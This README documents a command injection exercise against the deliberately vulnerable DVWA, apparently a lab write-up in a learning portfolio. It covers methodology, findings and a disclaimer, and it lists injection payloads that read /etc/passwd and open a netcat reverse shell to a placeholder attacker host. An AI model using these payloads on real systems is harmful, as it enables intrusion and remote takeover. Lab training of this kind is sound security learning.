# Command Injection Assessment

## Overview

This directory documents the assessment of the **Command Injection** vulnerability in the **Damn Vulnerable Web Application (DVWA)** performed within an isolated laboratory environment.

The objective was to determine whether user-controlled input could be manipulated to execute arbitrary operating system commands on the underlying server. Testing was performed using **Burp Suite**, manual payload modification, and controlled exploitation techniques.

---

## Objective

- Identify command injection vulnerabilities.
- Capture and analyze HTTP requests using Burp Suite.
- Validate arbitrary operating system command execution.
- Assess the impact of successful exploitation.
- Document findings and recommend remediation.

---

## Lab Environment

| Component | Details |
|-----------|---------|
| Target Application | Damn Vulnerable Web Application (DVWA) |
| Operating System | Kali Linux |
| Web Server | Apache |
| Database | MySQL |
| Proxy Tool | Burp Suite Community Edition |
| Additional Tool | Netcat |
| Security Level | Low |

---

## Testing Methodology

1. Configure DVWA security level to **Low**.
2. Navigate to the **Command Execution** module.
3. Capture the HTTP POST request using Burp Suite Proxy.
4. Send the request to Burp Repeater.
5. Modify the `ip` parameter with command injection payloads.
6. Analyze the server response.
7. Validate successful operating system command execution.
8. Document findings and remediation recommendations.

---

## Payloads Tested

### Execute Current User

```bash
127.0.0.1; whoami
```

### List Files

```bash
127.0.0.1; ls
```

### Read Sensitive File

```bash
127.0.0.1; cat /etc/passwd
```

### Reverse Shell (Lab Environment)

```bash
127.0.0.1; nc <attacker-ip> 4444 -e /bin/bash
```

> **Note:** The reverse shell demonstration was performed only within an isolated, authorized DVWA laboratory environment.

---

## Key Findings

- Successfully intercepted the vulnerable HTTP POST request.
- Verified arbitrary operating system command execution.
- Identified the web server user using `whoami`.
- Demonstrated unauthorized access to sensitive system files (`/etc/passwd`) in the lab.
- Successfully established a reverse shell in the controlled environment.
- Confirmed improper validation of user-supplied input.

---

## Skills Demonstrated

- Burp Suite Proxy
- Burp Suite Repeater
- HTTP Request Analysis
- Manual Vulnerability Validation
- Command Injection Testing
- Linux Command Line
- Reverse Shell Fundamentals
- Security Documentation
- Vulnerability Reporting

---

## Repository Contents

```
command-injection/

├── README.md
├── findings.md
├── remediation.md
├── report.md
├── screenshots.md
└── screenshots/
```

---

## Supporting Documentation

- **Findings:** `findings.md`
- **Remediation:** `remediation.md`
- **Assessment Report:** `report.md`
- **Evidence:** `screenshots.md`

---

## Learning Outcomes

This assessment provided practical experience in:

- Identifying OS Command Injection vulnerabilities.
- Understanding insecure server-side command execution.
- Modifying HTTP requests using Burp Suite.
- Evaluating the impact of arbitrary command execution.
- Preparing professional penetration testing documentation.

---

## Disclaimer

This assessment was conducted **only within an authorized DVWA laboratory environment** for educational purposes. All testing was performed against an intentionally vulnerable application running in a local virtual machine. No unauthorized systems or production environments were targeted.
